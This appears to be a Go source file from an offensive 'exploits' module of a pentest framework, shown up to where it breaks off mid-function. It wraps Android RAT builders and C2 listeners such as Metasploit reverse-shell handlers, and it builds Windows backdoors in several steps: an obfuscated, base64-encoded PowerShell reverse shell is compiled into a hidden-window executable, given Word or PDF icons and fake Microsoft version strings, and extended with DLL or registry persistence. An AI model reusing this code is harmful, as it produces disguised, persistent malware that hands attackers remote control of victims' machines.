package exploits

import (
    "os"
    "fmt"
    "log"
    "time"
    "utils"
    "bufio"
    "menus"
    "banners"
    "strconv"
    "strings"
    "bcolors"
    "io/ioutil"
    "subprocess"
    "scriptures"
    "path/filepath"
    "encoding/base64"
)

var (
    Protocol = "tcp"
    Icon = "word"
    Lport = "9999"
    Hport = "3333"
    C2 = "blackjack"
    Malware  = "africana_malware"
    Lhost = LhostIp
    scanner = bufio.NewScanner(os.Stdin)
    LhostIp, _ = utils.GetDefaultIP()
    Input, Rhost, Proxy, Function, Script string
    CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
)

var defaultValues = map[string]string{
    "proxies": "",
    "function": "",
    "script": "",
    "icon": "word",
    "lport": "9999",
    "hport": "3333",
    "c2": "blackjack",
    "protocol": "tcp",
    "build": "africana_malware",
    "lhost": LhostIp,
    "output": OutPutDir,
}

type stringMatcher struct {
    names  []string
    action func()
}

func ExploitsPentest() {
    for {
        fmt.Printf("%s%safr3%s exploits(%s%ssrc/pentest_%s.fn%s)%s > %s", bcolors.Underl, bcolors.Bold, bcolors.Endc, bcolors.Bold, bcolors.BrightRed, Function, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        scanner.Scan()
        Input = strings.TrimSpace(scanner.Text())
        buildParts := strings.Fields(strings.ToLower(Input))
        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(Input)
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{
        // Info/Help commands
        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "clear", "clear screen", "screen clear"}, utils.ClearScreen},

        //History/Junk commands
        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        // Run/exec commands
        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        // Set commands
        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        // Other commands
        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutarilas},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        // Setup commands
        {[]string{"info"}, menus.HelpInfoExploits},
        {[]string{"m", "menu"}, menus.MenuFour},
        {[]string{"option", "options", "show option", "show options"}, menus.ExploitsOptions},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListExploitsFunctions},

        // Commands executions
        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run androrat", "use androrat", "exec androrat", "start androrat", "launch androrat", "exploit androrat", "execute androrat"}, func() { AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir); menus.MenuFour() }},
        {[]string{"? 1", "info 1", "help 1", "androrat", "info androrat", "help androrat"}, menus.HelpInfoAndroRat},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run teardroid", "use teardroid", "exec teardroid", "start teardroid", "launch teardroid", "exploit teardroid", "execute teardroid"}, func() { TearDroid(Malware, ToolsDir, OutPutDir); menus.MenuFour() }},
        {[]string{"? 2", "info 2", "help 2", "teardroid", "info teardroid", "help teardroid"}, menus.HelpInfoTearDroid},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run blackjack", "use blackjack", "exec blackjack", "start blackjack", "launch blackjack", "exploit blackjack", "execute blackjack"}, func() { BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour() }},
        {[]string{"? 3", "info 3", "help 3", "blackjack", "info blackjack", "help blackjack"}, menus.HelpInfoBlackJack},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run hoaxshell", "use hoaxshell", "exec hoaxshell", "start hoaxshell", "launch hoaxshell", "exploit hoaxshell", "execute hoaxshell"}, func() { HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir); menus.MenuFour() }},
        {[]string{"? 4", "info 4", "help 4", "hoaxshell", "info hoaxshell", "help hoaxshell"}, menus.HelpInfoHoaxShell},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run shellz", "use shellz", "exec shellz", "start shellz", "launch shellz", "exploit shellz", "execute shellz"}, func() { Shellz(); menus.MenuFour() }},
        {[]string{"? 5", "info 5", "help 5", "shellz", "info shellz", "help shellz"}, menus.HelpInfoShellz},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run ghost", "use ghost", "exec ghost", "start ghost", "launch ghost", "exploit ghost", "execute ghost"}, func() { Gh0x0st(Malware, ToolsDir, Script, OutPutDir, C2); menus.MenuFour() }},
        {[]string{"? 6", "info 6", "help 6", "ghost", "info ghost", "help ghost"}, menus.HelpInfoGhost},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run noisemaker", "use noisemaker", "exec noisemaker", "start noisemaker", "launch noisemaker", "exploit noisemaker", "execute noisemaker"}, func() { NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2); menus.MenuFour() }},
        {[]string{"? 7", "info 7", "help 7", "noisemaker", "info noisemaker", "help noisemaker"}, menus.HelpInfoNoiseMaker},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run codebreaker", "use codebreaker", "exec codebreaker", "start codebreaker", "launch codebreaker", "exploit codebreaker", "execute codebreaker"}, func() { CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2); menus.MenuFour() }},
        {[]string{"? 8", "info 8", "help 8", "codebreaker", "info codebreaker", "help codebreaker"}, menus.HelpInfoCodeBreaker},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run listener", "use listener", "exec listener", "start listener", "launch listener", "exploit listener", "execute listener"}, func() { ListenerLauncher(Lport, Hport, Protocol, C2); menus.MenuFour() }},
        {[]string{"? 9", "info 9", "help 9", "listener", "info listener", "help listener"}, menus.HelpInfoListener},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

        "c2": &C2,
        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
        "protocol": &Protocol,
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s => %s\n", strings.ToUpper(key), value)
    } else {
        menus.HelpInfoSet()
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

        "c2": &C2,
        "icon": &Icon,
        "lhost": &Lhost,
        "lport": &Lport,
        "hport": &Hport,
        "script": &Script,
        "build": &Malware,
        "func": &Function,
        "proxies": &Proxy,
        "module": &Function,
        "output": &OutPutDir,
        "function": &Function,
        "protocol": &Protocol,
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = defaultValues[key] // Reset to default
        if *ptr != "" {
            fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
        }else{
            fmt.Printf("%s => %s\n", strings.ToUpper(key), "Null")
        }
    } else {
        menus.HelpInfoSet()
    }
}

func MalwarePenFunctions(Function string, args ...interface{}) {
    if Proxy != "" {
        fmt.Printf("PROXIES => %s\n", Proxy)
        if err := utils.SetProxy(Proxy); err != nil {
            // Error already printed by SetProxy
        }
    }

    // Command mapping with direct function references
    commands := map[string]func(){
        "androrat": func() { AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir) },
        "teardroid": func() { TearDroid(Malware, ToolsDir, OutPutDir) },
        "blackjack": func() { BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "hoaxshell": func() { HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "shellz": func() { Shellz() },
        "ghost": func() { Gh0x0st(Malware, ToolsDir, Script, OutPutDir, C2) },
        "noisemaker": func() { NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2) },
        "codebreaker": func() { CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2) },
        "listener": func() { ListenerLauncher(Lport, Hport, Protocol, C2) },
        "ncat": func() { Ncat(Lport, Protocol) },
        "havoc": func() { Havoc() },
        "seashell": func() { SeaShell() },
        "meterpeter": func() { MeterPeter() },
        "powerjoker": func() { PowerJoker(Lhost, Lport, ToolsDir) },
        "metasploit": func() { Metasploit(Lhost, Lport, Protocol) },

        // Numeric shortcuts
        "1": func() { AndroRat(Lhost, Lport, Malware, ToolsDir, OutPutDir) },
        "2": func() { TearDroid(Malware, ToolsDir, OutPutDir) },
        "3": func() { BlackJack(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "4": func() { HoaxShell(Lhost, Lport, Hport, Protocol, ToolsDir) },
        "5": func() { Shellz() },
        "6": func() { Gh0x0st(Malware, ToolsDir, Script, OutPutDir, C2) },
        "7": func() { NoiseMakers(ToolsDir, Lport, Hport, Protocol, Script, Icon, C2) },
        "8": func() { CodeBreakers(ToolsDir, Lport, Hport, Protocol, Script, Icon , C2) },
        "9": func() { ListenerLauncher(Lport, Hport, Protocol, C2) },
       "10": func() { Ncat(Lport, Protocol) },
       "11": func() { Havoc() },
       "12": func() { SeaShell() },
       "13": func() { MeterPeter() },
       "14": func() { PowerJoker(Lhost, Lport, ToolsDir) },
       "15": func() { Metasploit(Lhost, Lport, Protocol) },
    }

    // Command list for typo checking
    textCommands := []string{"ncat", "havoc", "ghost", "shellz", "seashell", "androrat", "listener", "teardroid", "blackjack", "hoaxshell", "meterpeter", "powerjoker", "metasploit", "noisemaker", "codebreaker" }

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    // Check if input was a number
    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("\n%s[!] %sNumber %d is invalid. Valid numbers are from 1-15.\n", bcolors.Yellow, bcolors.Endc, num)
        menus.ListExploitsFunctions()
        return
    }

    // Check for similar commands
    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("\n%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListExploitsFunctions()
}

func executeFunction() {
    if Function == "" {
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    MalwarePenFunctions(Function, Lhost, Lport, Hport, Protocol, C2, Malware)
}


func Havoc() {
    subprocess.Popen(`havoc client & havoc server -d -v`)
}

func Shellz() {
    subprocess.Popen(`cd %s/exploits/windows/c2/shells/; bash shells.sh`, ToolsDir)
}

func SeaShell() {
    subprocess.Popen(`cd %s/exploits/mackos/c2/seashell/; python3 sea_shell.py`, ToolsDir)
}

func MeterPeter() {
    subprocess.Popen(`cd %s/exploits/windows/c2/meterpeter/; pwsh meterpeter.ps1`, ToolsDir)
}

func TearDroid(Malware string, ToolsDir string, OutPutDir string) {
    fmt.Printf("\nBUILD => %s.apk\nOUTPUT => %s\n\n", Malware, OutPutDir)
    subprocess.Popen(`cd %s/exploits/androids/c2/teardroid/; python3 Teardroid.py -b %s`, ToolsDir, Malware)
}

func AndroRat(Lhost string, Lport string, Malware string, ToolsDir string, OutPutDir string) {
    filePath := "/usr/bin/zipalign.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`mv /usr/bin/zipalign /usr/bin/zipalign.bak_africana; apt-get install %s/exploits/androids/c2/androrat/zipalign_8.1.0.deb --allow-downgrades -y`, ToolsDir)
    }
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nBUILD => %s.apk\nOUTPUT => %s\n\n", Lhost, Lport, Malware, OutPutDir)
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --build -i %s -p %s -o %s/%s.apk", ToolsDir, Lhost, Lport, OutPutDir, Malware))
    subprocess.Popen(fmt.Sprintf("cd %s/exploits/androids/c2/androrat/; python3 androrat.py --shell -i %s -p %s", ToolsDir, Lhost, Lport))
}

func Chameleon(Malware string, ToolsDir string, Script string, OutPutDir string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s\n\n", Malware, Script, OutPutDir)
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/chameleon/; python3 chameleon.py -f -s --verbose %s -o %s/%s`, ToolsDir, Script, OutPutDir, Malware)

}

func Gh0x0st(Malware string, ToolsDir string, Script string, OutPutDir string, C2 string) {
    if Script == "" {
        fmt.Printf("\n%s[!] %s SCRIPT location not set. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    fmt.Printf("\nBUILD => %s\nSCRIPT => %s\nOUTPUT => %s%s\n\n", Malware, Script, OutPutDir,  Malware + ".ps1")
    subprocess.Popen(`cd %s/exploits/windows/obfuscators/Invoke-PSObfuscation/; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s%s"`, ToolsDir, Script, OutPutDir, Malware + ".ps1")
    if C2 != "" {
        ListenerLauncher(Lport, Hport, Protocol, C2)
        return
    }
}

func PowerJoker(Lhost string, Lport string, ToolsDir string) {
    fmt.Printf("\nLHOST => %s\nLPORT => %s\n\n", Lhost, Lport)
    subprocess.Popen(`cd %s/exploits/windows/c2/joker/; python3 joker.py -l %s -p %s`, ToolsDir, Lhost, Lport)
}

func HoaxShell(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/hoaxshell/; python3 hoaxshell.py -s %s -p %s", ToolsDir, Lhost, Lport)
    case "http", "https":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/hoaxshell/; python3 hoaxshell.py -s %s -c /root/.afr3/certs/afr_cert.pem -k /root/.afr3/certs/afr_key.pem -p %s", ToolsDir, Lhost, Lport)
        fmt.Println()
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func BlackJack(Lhost string, Lport string, Hport string, Protocol string, ToolsDir string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -n %s\n", ToolsDir, Lport)
    case "http", "https":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
        subprocess.Popen("cd %s/exploits/windows/c2/blackjack/; python3 blackjack.py -q -i -c /root/.afr3/certs/afr_cert.pem -k /root/.afr3/certs/afr_key.pem -x %s -n %s", ToolsDir, Lport, Hport)
        fmt.Println()
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func Ncat(Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`rlwrap ncat -lnvp %s`, Lport)
    case "http", "https":
         fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Hport, Protocol)
         subprocess.Popen(`rlwrap ncat --ssl --ssl-key %s/afr_key.pem --ssl-cert %s/afr_cert.pem -lnvp %s`, CertDir, CertDir, Lport)
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func Metasploit(Lhost string, Lport string, Protocol string) {
    switch strings.ToLower(Protocol) {
    case "tcp":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    case "http", "https":
        fmt.Printf("\nLHOST => %s\nLPORT => %s\nPROTOCOL => %s\n\n", Lhost, Lport, Protocol)
        subprocess.Popen(`msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set LHOST %s; set LPORT %s; set ExitOnSession false; exploit -j"`, Lhost, Lport)
    default:
        fmt.Println(bcolors.BrightRed + "[!] " + bcolors.Endc + "Error: Invalid LISTENER type")
    }
}

func ShikataGanai(ToolsDir string, Lport string, Hport string, Protocol string, Script string, C2 string) {
    // Print configuration
    fmt.Printf("\nLHOST => %s\nLPORT => %s\nHPORT => %s\nICON => %s\nPROTOCOL => %s\nC2 => %s\n", Lhost, Lport, Hport, Icon, Protocol, C2)

    // Validate protocol
    protocol := strings.ToLower(Protocol)
    if protocol != "tcp" && protocol != "http" && protocol != "https" {
        fmt.Printf(bcolors.BrightRed + "[!] " + bcolors.Endc + "LISTENER %s not found. Try help command ...\n", Protocol)
        return
    }

    // Common paths
    const (
        outputDir       = "/root/.afr3/output"
        templateDir     = "exploits/payload_templates"
        obfuscatorPath  = "exploits/windows/obfuscators/Invoke-PSObfuscation"
        goTemplate      = "go_payloads/raw_backdoor.go"
        psTemplate      = "ncat_payloads/powershell_reverse_%s.ps1"
        outputExe       = "raw_backdoor.exe"
    )

    // Step 1: Copy and modify PowerShell template
    psSrc := filepath.Join(ToolsDir, templateDir, fmt.Sprintf(psTemplate, protocol))
    psTxt := filepath.Join(outputDir, fmt.Sprintf("powershell_reverse_%s.txt", protocol))
    
    if err := utils.Copy(psSrc, psTxt); err != nil {
        log.Fatal("Copy failed:", err)
    }
    fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)

    // Replace placeholders
    utils.Editors(map[string]map[string]string{
        psTxt: {"*LHOST*": Lhost, "*LPORT*": Lport},
    })

    // Step 2: Obfuscate PowerShell script
    psOb := filepath.Join(outputDir, fmt.Sprintf("powershell_reverse_%s.ps1", protocol))
    subprocess.Popen(`cd %s/%s; pwsh -c "Import-Module ./Invoke-PSObfuscation.ps1; Invoke-PSObfuscation -Path %s -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges -o %s"`, ToolsDir, obfuscatorPath, psTxt, psOb)

    // Step 3: Encode to PowerShell command
    encoded, err := utils.EncodeFileToPowerShellEncodedCommand(psOb)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error encoding file: %v\n", err)
        return
    }

    // Step 4: Copy and modify Go template
    goSrc := filepath.Join(ToolsDir, templateDir, goTemplate)
    goDst := filepath.Join(outputDir, "raw_backdoor.go")

    if err := utils.Copy(goSrc, goDst); err != nil {
        log.Fatal("Copy failed:", err)
    }
    fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)

    utils.Editors(map[string]map[string]string{
        goDst: {"africana_backdoor": encoded},
    })

    // Step 5: Print encoded command and compile
    fmt.Printf("\n%s[>] %sEncoding payload to base64 ...%s\npowershell -w 1 -enc %s\n", bcolors.Yellow, bcolors.BrightBlue, bcolors.Endc, encoded)
    fmt.Printf("\n%s[>] %sConverting base64 payload to executable %s...\n", bcolors.Yellow, bcolors.BrightBlue, bcolors.Endc)

    spinner := utils.New(
        utils.WithStyle("dots"), 
        utils.WithEffect("plain"),
        utils.WithText("%s[+] %sCompiling hidden backdoor ...\n", bcolors.Green, bcolors.Endc),
        utils.WithSpeed(180 * time.Millisecond),
    )
    spinner.Start()
    subprocess.Popen("GOOS=windows GOARCH=amd64 go build -ldflags='-w -s -H windowsgui' -o %s/%s %s", outputDir, outputExe, filepath.Join(outputDir, "raw_backdoor.go"))
    spinner.Stop()
    endMalwarePath := filepath.Join(outputDir, outputExe)
    IconChanger(endMalwarePath, "lync")
}

func IconChanger(ExePath, Icon string) {
    spinner := utils.New(
        utils.WithStyle("dots"),
        utils.WithEffect("plain"),
        utils.WithText("%s[+] %sDisguising the final backdoor ...\n", bcolors.Green, bcolors.Endc),
        utils.WithSpeed(180 * time.Millisecond),
    )
    fmt.Printf("\n%s[>] %sDisguising backdoor with %s%s icon %s...\n", bcolors.Yellow, bcolors.BrightBlue, bcolors.Green, Icon, bcolors.Endc)

    // Define paths
    iconDir := filepath.Join(ToolsDir, "exploits/payload_templates/icons")
    rcedit := filepath.Join(ToolsDir, "exploits/payload_templates/rcedits/rcedit-x86.exe")

    // Validate executable exists
    if _, err := os.Stat(ExePath); os.IsNotExist(err) {
        fmt.Printf("%s[-] Error: Executable file not found at %s%s\n", bcolors.Red, ExePath, bcolors.Endc)
        return
    }

    // Validate icon choice
    validIcons := map[string]bool{ 
        "lync": true, "excel": true, "access": true, "autorun": true, "pdf": true, "project": true, "publisher": true, "powerpoint": true, "rat": true, "vlc": true, "word": true, "visio": true,
    }

    icon := strings.ToLower(Icon)
    if !validIcons[icon] {
        fmt.Printf("%s[-] Error: Invalid icon choice '%s'%s\n", bcolors.Red, Icon, bcolors.Endc)
        utils.SystemShell(Input)
        return
    }

    // Validate icon file exists
    iconPath := filepath.Join(iconDir, icon + ".ico")
    if _, err := os.Stat(iconPath); os.IsNotExist(err) {
        fmt.Printf("%s[-] Error: Icon file not found at %s%s\n", bcolors.Red, iconPath, bcolors.Endc)
        return
    }

    // Validate rcedit exists
    if _, err := os.Stat(rcedit); os.IsNotExist(err) {
        fmt.Printf("%s[-] Error: rcedit not found at %s%s\n", bcolors.Red, rcedit, bcolors.Endc)
        return
    }

    // Build the command
    cmd := fmt.Sprintf(`wine %s %s --set-file-version "10.0.21994.1" --set-product-version "10.0.21994.1" --set-icon %s --set-version-string OriginalFilename "MicrosoftSecurities.exe" --set-version-string FileDescription "Microsoft Help and Support"`, rcedit, ExePath, iconPath)

    spinner.Start()
    if err := subprocess.Popen(cmd); err != nil {
        fmt.Printf("%s[-] Error executing command: %v%s\n", bcolors.Red, err, bcolors.Endc)
    }
    spinner.Stop()
    fmt.Printf("%s[+] Icon changed successfully!%s\n", bcolors.Green, bcolors.Endc)
}

 //dll persistence mechanisim//
func NoiseMakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    // Create spinner with custom options
    spinner := utils.New(
        utils.WithStyle("arrow"),
        utils.WithEffect("plain"),
        utils.WithText("%s[+] %sDisguising %s with %s icon...\n", bcolors.Green, bcolors.Endc, "/root/.afr3/output/africana_backdoor.exe", Icon),
        utils.WithSpeed(180 * time.Millisecond),
    )

    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)
    dllFilePath := "/root/.afr3/africana-base/exploits/payload_templates/dll_injects/Secur32.dll"
    exeFilePath := "/root/.afr3/output/raw_backdoor.exe"

    dllData, err := ioutil.ReadFile(dllFilePath)
    if err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed reading binary file: %s", err)
    }

    exeData, err := ioutil.ReadFile(exeFilePath)
    if err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)
    encodedDll := base64.StdEncoding.EncodeToString(dllData)

    src := filepath.Join(ToolsDir, "exploits/payload_templates/go_payloads/malware_runner_dll.go")
    dst := filepath.Join(OutPutDir, "malware_runner_dll.go")

    if err := utils.Copy(src, dst); err != nil {
        log.Fatal("Copy failed:", err)
    } else {
        fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
    }

    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_dll.go": {
        "africana_backdoor_e": encodedExe,
        `africana_backdoor_d`: encodedDll,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOOS environment variable: %s", err)
    }
    if err := os.Setenv("GOARCH", "amd64"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOARCH environment variable: %s", err)
    }

    runnerFilePath := "/root/.afr3/output/malware_runner_dll.go"
    endMalwarePath := "/root/.afr3/output/africana_backdoor.exe"

    fmt.Printf("\n%s[>] %shooking .exe with .dll for persistence ...\n", bcolors.Yellow, bcolors.Endc)

    spinner.Start()
    buildCmd := "go build -ldflags='-w -s -H windowsgui' -o %s %s"
    formattedCmd := fmt.Sprintf(buildCmd, endMalwarePath, runnerFilePath)
    subprocess.Popen(formattedCmd)
    spinner.Stop()

    IconChanger(endMalwarePath, Icon)
    log.Printf("\n\n%s[+] %scomplete backdoor saved at: %s%s%s\n", bcolors.Green, bcolors.Endc, bcolors.BrightBlue, endMalwarePath, bcolors.Endc)
    ListenerLauncher(Lport, Hport, Protocol, C2)
}

//regestry persistence mechanisim//
func CodeBreakers(ToolsDir string, Lport string, Hport string, Protocol string, Script string, Icon string, C2 string) {
    // Create spinner with custom options
    spinner := utils.New(
        utils.WithStyle("arrow"),
        utils.WithEffect("plain"),
        utils.WithText("%s[+] %sDisguising %s with %s icon...\n", bcolors.Green, bcolors.Endc, "/root/.afr3/output/africana_backdoor.exe", Icon),
        utils.WithSpeed(180 * time.Millisecond),
    )
    ShikataGanai(ToolsDir, Lport, Hport, Protocol, Script, C2)

    exeFilePath := "/root/.afr3/output/raw_backdoor.exe"
    exeData, err := ioutil.ReadFile(exeFilePath)

    if err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed reading executable file: %s", err)
    }

    encodedExe := base64.StdEncoding.EncodeToString(exeData)

    src := filepath.Join(ToolsDir, "exploits/payload_templates/go_payloads/malware_runner_reg.go")
    dst := filepath.Join(OutPutDir, "malware_runner_reg.go")

    if err := utils.Copy(src, dst); err != nil {
        log.Fatal("Copy failed:", err)
    } else {
        fmt.Printf("\n%s[+] %sCopy succeeded!\n", bcolors.BrightGreen, bcolors.Endc)
    }

    filesToReplacements := map[string]map[string]string{
        "/root/.afr3/output/malware_runner_reg.go": {
        "africana_backdoor_e": encodedExe,
        },
    }
    utils.Editors(filesToReplacements)

    if err := os.Setenv("GOOS", "windows"); err != nil {
        log.Fatalf(bcolors.BrightRed + "[!] " + bcolors.Endc + "Failed to set GOOS environment variable: %s", err)
    }
